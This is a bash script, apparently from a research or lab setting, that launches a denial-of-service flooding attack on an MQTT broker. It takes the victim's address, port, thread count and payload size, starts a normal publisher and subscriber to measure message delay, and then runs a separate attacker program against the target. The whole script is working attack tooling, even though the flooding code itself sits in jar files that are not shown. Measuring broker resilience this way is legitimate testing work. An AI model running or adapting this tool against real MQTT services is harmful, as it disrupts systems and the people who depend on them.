#!/bin/bash

#A tool for MQTT flooding attack
#Author Cong Bao

url="127.0.0.1"
port="10000"
topic="default_topic"
content="default_content"
number="1000"
size="5000"
delay="5000"

Help () {
  echo "Usage: mqttAtk [-options] [args...]"
  echo "       or just mqttAtk to show this help and clear cache"
  echo "where options include:"
  echo "  -u  the url of the victim server"
  echo "      Default value is 127.0.0.1"
  echo "  -p  the port of the victim server"
  echo "      Default value is 10000"
  echo "  -t  the topic of message used to test delay time"
  echo "      Default value is default_topic"
  echo "  -c  the content of message used to test delay time"
  echo "      Default value is default_content"
  echo "  -n  the number of threads to lunch attacks"
  echo "      Default value is 1000"
  echo "  -s  the size of the payload in each thread"
  echo "      Default value is 5000"
  echo "  -d  the delay time of lunching attack in ms"
  echo "      Default value is 5000"
  echo "  -h  show this help"
}

echo "Please make sure the victim server is running before using this tool!"

if [ $# -eq 0 ]
  then Help
else

while getopts "u:p:t:c:n:s:d:h" arg
do
  case $arg in
    u) url=$OPTARG;;
    p) port=$OPTARG;;
    t) topic=$OPTARG;;
    c) content=$OPTARG;;
    n) number=$OPTARG;;
    s) size=$OPTARG;;
    d) delay=$OPTARG;;
    h) Help
       exit 0
       ;;
    ?) echo "use -h to see help";;
  esac
done

echo 
echo "Params:"
echo "url = $url; port = $port; topic = $topic; content = $content; number = $number; size = $size; delay = $delay"
echo 
echo "Start building a normal mqtt connection..."
`gnome-terminal -x bash -c "java -jar /home/bao/DoStool/mqttAtk/Publisher.jar $url $port $topic $content"`
`gnome-terminal -x bash -c "java -jar /home/bao/DoStool/mqttAtk/Subscriber.jar $url $port $topic"`
echo "Normal connection was built successfully."
echo
echo "Attack will lunch in $delay ms..."
`java -jar /home/bao/DoStool/mqttAtk/Attacker.jar $url $port $number $size $delay`
echo

fi
